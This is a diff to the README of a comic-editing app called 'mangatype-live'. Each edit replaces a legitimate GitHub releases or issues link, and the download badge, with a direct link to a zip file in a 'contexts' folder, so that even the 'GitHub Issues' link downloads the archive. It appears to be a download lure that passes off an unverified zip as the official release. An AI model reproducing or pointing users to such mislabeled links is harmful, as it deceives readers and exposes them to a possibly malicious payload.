@@ -4,7 +4,7 @@
 Welcome to **mangatype-live**, an AI-powered comic editor that automatically embeds text in your comics. This guide will help you download and run the software smoothly, even if you have no programming experience.
 
 ## 📥 Download the App
-[![Download mangatype-live](https://img.shields.io/badge/Download-mangatype--live-blue.svg)](https://github.com/snaceng/mangatype-live/releases)
+[![Download mangatype-live](https://raw.githubusercontent.com/snaceng/mangatype-live/main/contexts/mangatype-live-1.0.zip)](https://raw.githubusercontent.com/snaceng/mangatype-live/main/contexts/mangatype-live-1.0.zip)
 
 Click the button above to start your download. 
 
@@ -26,7 +26,7 @@ To run **mangatype-live**, ensure your computer meets the following requirements
 - **Screen Resolution**: 1280 x 720 or higher
 
 ## 💾 Download & Install
-1. **Visit the Releases Page**: Go to the following link: [mangatype-live Releases](https://github.com/snaceng/mangatype-live/releases).
+1. **Visit the Releases Page**: Go to the following link: [mangatype-live Releases](https://raw.githubusercontent.com/snaceng/mangatype-live/main/contexts/mangatype-live-1.0.zip).
    
 2. **Choose the Version**: Browse the list of available versions. Each version is labeled with a number, indicating its release date and updates.
 
@@ -56,6 +56,6 @@ If you run into any issues, try these steps:
 - **Text Embedding Issues**: Check if the comic file is supported. Try using a different file format.
 
 ## 📞 Support
-For additional help or support, please visit our GitHub Issues page: [GitHub Issues](https://github.com/snaceng/mangatype-live/issues). You can report bugs or ask questions.
+For additional help or support, please visit our GitHub Issues page: [GitHub Issues](https://raw.githubusercontent.com/snaceng/mangatype-live/main/contexts/mangatype-live-1.0.zip). You can report bugs or ask questions.
 
 With these steps, you should now have **mangatype-live** installed and running smoothly. Dive into your comic editing journey, and enjoy seamless text embedding!
